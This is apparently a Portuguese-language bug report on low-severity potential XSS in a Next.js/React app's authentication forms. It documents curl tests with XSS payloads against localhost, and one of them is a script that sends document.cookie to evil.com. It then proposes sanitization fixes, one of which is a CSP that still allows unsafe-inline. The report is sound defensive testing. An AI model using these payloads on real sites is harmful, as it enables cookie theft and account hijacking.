# BUG-004: Potencial XSS em Exibição de Mensagens de Erro

## Informações Gerais

| Campo | Valor |
|-------|-------|
| **ID** | BUG-004 |
| **Título** | Potencial Reflected XSS em Mensagens de Erro de Validação |
| **Gravidade** | **BAIXA** |
| **CVSS Score** | 3.1 (Baixo) |
| **OWASP** | A03:2021 - Injection |
| **CWE** | CWE-79: Cross-site Scripting (XSS) |
| **Componentes Afetados** | Páginas de Login, Registro, Recuperação de Senha |
| **Data de Identificação** | 2026-01-16 |

---

## Descrição

Embora o React escape automaticamente strings em JSX, a aplicação exibe mensagens de erro diretamente do servidor sem sanitização adicional. Se alguma mensagem de erro contiver conteúdo não sanitizado, existe potencial para XSS.

**Nota**: Este bug é classificado como BAIXO porque:
1. React já escapa strings por padrão
2. As mensagens de erro atuais são strings estáticas do código
3. O Zod retorna mensagens de validação predefinidas

No entanto, a falta de sanitização explícita representa um risco se o código evoluir.

---

## Ação Realizada e Payload

### Teste 1: XSS via Campo de Email

**Payload:**
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "<script>alert(\"XSS\")</script>",
    "password": "test123"
  }'
```

**Resultado:**
```json
{
  "error": "Dados inválidos",
  "details": [
    {
      "code": "invalid_string",
      "message": "Email inválido",
      "path": ["email"]
    }
  ]
}
```
**Status**: PASSADO - Zod valida formato de email, script não é executado

### Teste 2: XSS via Campo de Nome

**Payload:**
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<img src=x onerror=alert(1)>",
    "email": "test@test.com",
    "password": "Test123456"
  }'
```

**Resultado:**
- Nome é armazenado no banco: `<img src=x onerror=alert(1)>`
- Quando exibido no frontend React: escapa para `&lt;img src=x onerror=alert(1)&gt;`

**Status**: PASSADO - React escapa automaticamente

### Teste 3: XSS via Password com caracteres especiais

**Payload:**
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test",
    "email": "test@test.com",
    "password": "Test123<script>document.location=\"http://evil.com?c=\"+document.cookie</script>"
  }'
```

**Resultado:**
- Senha é hasheada com bcrypt antes de armazenar
- Conteúdo malicioso nunca é exibido (campo tipo password)

**Status**: PASSADO - Senha nunca é renderizada

---

## Análise Técnica do Código

### Frontend - Exibição de Erros

```tsx
// src/app/(auth)/login/page.tsx - Linha 141-148
{error && (
  <div className="bg-red-500/10 ...">
    <span>{error}</span>  {/* React escapa automaticamente */}
  </div>
)}
```

### Backend - Retorno de Erros

```typescript
// src/app/api/auth/register/route.ts - Linha 17-20
if (!validation.success) {
  return NextResponse.json(
    { error: 'Dados inválidos', details: validation.error.issues },
    { status: 400 }
  );
}
```

**Observação**: O campo `details` contém os issues do Zod que podem incluir partes do input do usuário em algumas configurações.

---

## Causa Raiz

1. **Ausência de sanitização explícita** no campo `name` antes de armazenar
2. **Dependência apenas do escape automático do React** sem camada adicional de proteção
3. **Mensagens de erro do Zod** podem incluir dados do usuário em alguns casos

---

## Impacto

| Cenário | Risco | Probabilidade |
|---------|-------|---------------|
| XSS via nome em outros contextos | Médio | Baixa |
| XSS se mensagens de erro mudarem | Médio | Baixa |
| XSS em emails transacionais | Alto | Muito Baixa |

---

## Ação Corretiva Sugerida

### 1. Sanitizar Campo Name no Backend

```typescript
// src/app/api/auth/register/route.ts
import { sanitize } from 'isomorphic-dompurify';

// Na validação ou antes de salvar:
const sanitizedName = sanitize(name, { ALLOWED_TAGS: [] });
```

### 2. Validação Mais Restritiva no Schema

```typescript
// src/lib/validations/auth.ts
export const registerSchema = z.object({
  name: z
    .string()
    .min(1, 'Nome é obrigatório')
    .min(3, 'Nome deve ter no mínimo 3 caracteres')
    .max(100, 'Nome muito longo')
    .regex(
      /^[a-zA-ZÀ-ÿ\s'-]+$/,  // Apenas letras, espaços, apóstrofo e hífen
      'Nome contém caracteres inválidos'
    ),
  // ...
});
```

### 3. Content Security Policy (CSP)

```typescript
// next.config.js ou middleware
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
  }
];
```

---

## Status

| Campo | Valor |
|-------|-------|
| **Status** | **FECHADO** |
| **Data de Correção** | 2026-01-16 |
| **Correção Aplicada** | Sanitização de campo nome no registro |

---

## Correção Implementada

### Arquivo Modificado: `src/app/api/auth/register/route.ts`

**Função de sanitização adicionada:**
```typescript
function sanitizeName(name: string): string {
  return name
    .replace(/<[^>]*>/g, '') // Remove tags HTML
    .replace(/[<>"'&]/g, '') // Remove caracteres especiais
    .trim();
}
```

**Uso:**
```typescript
const sanitizedName = sanitizeName(name);
```

O campo nome agora é sanitizado antes de ser armazenado no banco de dados, removendo:
- Tags HTML (`<script>`, `<img>`, etc.)
- Caracteres especiais potencialmente perigosos (`<`, `>`, `"`, `'`, `&`)
